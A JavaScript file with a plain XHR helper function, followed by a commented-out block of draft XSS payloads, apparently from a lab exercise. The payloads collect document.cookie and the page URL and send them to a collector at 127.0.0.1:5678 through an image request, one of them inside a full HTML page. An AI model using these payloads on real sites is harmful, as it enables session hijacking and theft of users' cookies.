
function ajaxRequest(type, url, callback, data = null)
{
  let xhr;

  // Create XML HTTP request.
  xhr = new XMLHttpRequest();
  if (type == 'GET' && data != null)
    url += '?' + data;

  

  xhr.open(type, url);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

  // Add the onload function.
  xhr.onload = () =>
  {
    switch (xhr.status)
    {
      case 200:
      case 201:
        callback(JSON.parse(xhr.responseText));
        break;
      default:
        // httpErrors(xhr.status);
    }
  };

  // Send XML HTTP request.
  xhr.send(data);
}


/*
var cookieData = document.cookie;
var urlData = document.location.href;
var requestData = document.lastModified; 
var data = "Cookie data: " + cookieData + "\n" +            "URL data: " + urlData + "\n" +            "Request data: " + requestData; var img = new Image(); img.src = "http://127.0.0.1:5678/index.php?ville=" + encodeURIComponent(data);
alert(data);






 var cookieData = document.cookie;
var urlData = document.location.href;
var requestData = document.lastModified; 
var data = "Cookie data: " + cookieData + "\n" +            "URL data: " + urlData + "\n" +            "Request data: " + requestData; var img = new Image(); img.src = "http://127.0.0.1:5678/index.php?ville=" + encodeURIComponent(data);
alert(data);


<script>
  var cookieData = document.cookie;
  var urlData = document.location.href;
  var requestData = document.lastModified;
  var data = "Cookie data: " + cookieData + "\n" +
             "URL data: " + urlData + "\n" +
             "Request data: " + requestData;
  document.write(data);
</script>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Ma page HTTP avec du code JavaScript</title>
    <script>
      var cookieData = document.cookie;
      var urlData = document.location.href;
      var requestData = document.lastModified;
      var data = "Cookie data: " + cookieData + "\n" +
                 "URL data: " + urlData + "\n" +
                 "Request data: " + requestData;
      var img = new Image();
      img.src = "http://127.0.0.1:5678/0.08/index.php" + encodeURIComponent(data);
      alert(data);
    </script>
  </head>
  <body>
    <h1>Ma page HTTP avec du code JavaScript</h1>
    <p>Le code JavaScript s'exécute ici.</p>
  </body>
</html>


*/